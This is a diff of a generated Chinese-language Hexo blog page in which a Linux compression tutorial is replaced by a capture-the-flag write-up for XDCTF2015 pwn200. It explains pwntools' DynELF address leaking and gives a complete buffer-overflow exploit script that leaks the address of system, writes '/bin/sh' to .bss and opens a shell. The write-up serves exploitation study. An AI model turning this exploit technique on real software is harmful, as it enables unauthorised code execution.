@@ -87,7 +87,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="linux," />
+  <meta name="keywords" content="pwn," />
 
 
 
@@ -103,17 +103,17 @@
 
 
 
-<meta name="description" content="好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar">
-<meta name="keywords" content="linux">
+<meta name="description" content="该题用到了 DynELF 技术   DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。12345678910p = process(&amp;apos;./xxx&amp;apos;)def leak(address):  #各种预处理  payload = &amp;quot;xxxxxxxx&amp;quot; + address + &amp;quot;xxxxxxxx&amp;quot;  p">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linux之文件打包与解压缩">
-<meta property="og:url" content="http://yoursite.com/2017/06/06/linux文件压缩/index.html">
+<meta property="og:title" content="XDCTF2015-pwn200(DynELF)'">
+<meta property="og:url" content="http://yoursite.com/2018/03/18/XDCTF2015-pwn200/index.html">
 <meta property="og:site_name" content="尿尿">
-<meta property="og:description" content="好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar">
-<meta property="og:updated_time" content="2017-06-06T10:26:05.306Z">
+<meta property="og:description" content="该题用到了 DynELF 技术   DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。12345678910p = process(&amp;apos;./xxx&amp;apos;)def leak(address):  #各种预处理  payload = &amp;quot;xxxxxxxx&amp;quot; + address + &amp;quot;xxxxxxxx&amp;quot;  p">
+<meta property="og:updated_time" content="2018-03-18T11:48:59.635Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="linux之文件打包与解压缩">
-<meta name="twitter:description" content="好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar">
+<meta name="twitter:title" content="XDCTF2015-pwn200(DynELF)'">
+<meta name="twitter:description" content="该题用到了 DynELF 技术   DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。12345678910p = process(&amp;apos;./xxx&amp;apos;)def leak(address):  #各种预处理  payload = &amp;quot;xxxxxxxx&amp;quot; + address + &amp;quot;xxxxxxxx&amp;quot;  p">
 
 
 
@@ -141,13 +141,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/06/06/linux文件压缩/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/03/18/XDCTF2015-pwn200/"/>
 
 
 
 
 
-  <title> linux之文件打包与解压缩 | 尿尿 </title>
+  <title> XDCTF2015-pwn200(DynELF)' | 尿尿 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="en">
@@ -314,7 +314,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/06/linux文件压缩/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/18/XDCTF2015-pwn200/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lin Miaoqian">
@@ -335,7 +335,7 @@
             
             
               
-                linux之文件打包与解压缩
+                XDCTF2015-pwn200(DynELF)'
               
             
           </h1>
@@ -350,8 +350,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-06T16:01:56+08:00">
-                2017-06-06
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-18T19:40:11+08:00">
+                2018-03-18
               </time>
             
 
@@ -361,28 +361,6 @@
           </span>
 
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学习/" itemprop="url" rel="index">
-                    <span itemprop="name">学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -391,9 +369,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/06/06/linux文件压缩/#comments" itemprop="discussionUrl">
+                <a href="/2018/03/18/XDCTF2015-pwn200/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/06/06/linux文件压缩/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2018/03/18/XDCTF2015-pwn200/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -419,7 +397,12 @@
       
 
       
-        <p>好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。<br>本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar<br><a id="more"></a> </p>
+        <p>该题用到了 DynELF 技术  </p>
+<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">p = process(&apos;./xxx&apos;)</div><div class="line">def leak(address):</div><div class="line">  #各种预处理</div><div class="line">  payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;</div><div class="line">  p.send(payload)</div><div class="line">  #各种处理</div><div class="line">  data = p.recv(4)</div><div class="line">  return data</div><div class="line">d = DynELF(leak, elf=ELF(&quot;./xxx&quot;))      #初始化DynELF模块 </div><div class="line">systemAddress = d.lookup(&apos;system&apos;, &apos;libc&apos;)  #在libc文件中搜索system函数的地址</div></pre></td></tr></table></figure></p>
+<p>再看read 函数：<br>定义函数：ssize_t read(int fd, void * buf, size_t count);<br>函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中.  若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.  </p>
+<p>思路：<br>1.调用main函数循环利用<br>2.泄露出system地址<br>3.写入”/bin/sh”<br>4.调用system获取shell，在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress。保证堆栈平衡</p>
+<p>查找gadget：<br><code>ROPgadget --binary pwn200 --only &quot;pop|ret&quot;</code><br>使用：<br><code>0x08048649 : pop esi ; pop edi ; pop ebp ; ret</code>   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">elf = ELF(&apos;./pwn200&apos;)</div><div class="line">io = process(&apos;./pwn200&apos;)</div><div class="line">write_plt = elf.plt[&apos;write&apos;] # symbols 也可以</div><div class="line">read_plt = elf.plt[&apos;read&apos;]</div><div class="line">main_addr = 0x80483e0 </div><div class="line">bss_addr = elf.bss() #用来存储&apos;/bin/sh&apos;</div><div class="line">pppr = 0x08048649 </div><div class="line"></div><div class="line">def leak(addr):</div><div class="line">    io.recvuntil(&apos;Welcome to XDCTF2015~!\n&apos;)</div><div class="line">    payload = &apos;a&apos;*112+p32(write_plt)+p32(main_addr)+p32(1)+p32(addr)+p32(4)</div><div class="line">    io.sendline(payload)</div><div class="line">    msg = io.recv(4)</div><div class="line">    return msg</div><div class="line"></div><div class="line">dyn = DynELF(leak,elf=elf)  </div><div class="line">sys_addr = dyn.lookup(&apos;system&apos;,&apos;libc&apos;)</div><div class="line">payload = &apos;a&apos;*112+p32(read_plt)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8)+p32(sys_addr)+p32(main_addr)+p32(bss_addr)</div><div class="line">io.sendline(payload)</div><div class="line">io.sendline(&apos;/bin/sh\0&apos;)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -449,7 +432,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/linux/" rel="tag"># linux</a>
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
           
         </div>
       
@@ -462,8 +445,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/06/06/pictures/" rel="next" title="如何在 hexo 博客中插入图片">
-                <i class="fa fa-chevron-left"></i> 如何在 hexo 博客中插入图片
+              <a href="/2018/03/18/b0verfl0w/" rel="next" title="b0verfl0w'">
+                <i class="fa fa-chevron-left"></i> b0verfl0w'
               </a>
             
           </div>
@@ -472,8 +455,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/04/14/learncss1/" rel="prev" title="CSS基础学习[1]">
-                CSS基础学习[1] <i class="fa fa-chevron-right"></i>
+              <a href="/2018/03/17/PlaidCTF-2013-ropasaurusrex/" rel="prev" title="'PlaidCTF-2013-ropasaurusrex'">
+                'PlaidCTF-2013-ropasaurusrex' <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -784,9 +767,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yoursite.com/2017/06/06/linux文件压缩/';
-          this.page.identifier = '2017/06/06/linux文件压缩/';
-          this.page.title = 'linux之文件打包与解压缩';
+          this.page.url = 'http://yoursite.com/2018/03/18/XDCTF2015-pwn200/';
+          this.page.identifier = '2018/03/18/XDCTF2015-pwn200/';
+          this.page.title = 'XDCTF2015-pwn200(DynELF)\'';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://yuuoniy.disqus.com/embed.js';
